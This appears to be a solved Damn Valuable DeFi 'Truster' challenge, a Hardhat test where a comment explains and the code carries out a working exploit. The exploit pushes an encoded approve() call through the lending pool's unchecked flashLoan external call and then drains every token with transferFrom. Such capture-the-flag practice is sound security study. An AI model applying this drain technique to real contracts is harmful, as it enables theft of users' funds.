const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        //we need to transfer tokens from the pool to the attacker contract. Our lenderPool contract
        //contains an externall call (by specifying a contract address and msg.data: func selector and arguments) 
        //to another arbitrary contract inside its flashloan function. In this call, the pool contract itself 
        //will be the msg.sender. 
        //We can exploit this fault and make the pool approve the attacker to be able to spend its 
        //tokens on behalf, and drain the pool afterwards.  
        const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"])
        const calldata = iface.encodeFunctionData("approve",[attacker.address, TOKENS_IN_POOL ])
        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, calldata)
        await this.token.connect(attacker).transferFrom( this.pool.address ,attacker.address, TOKENS_IN_POOL)

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

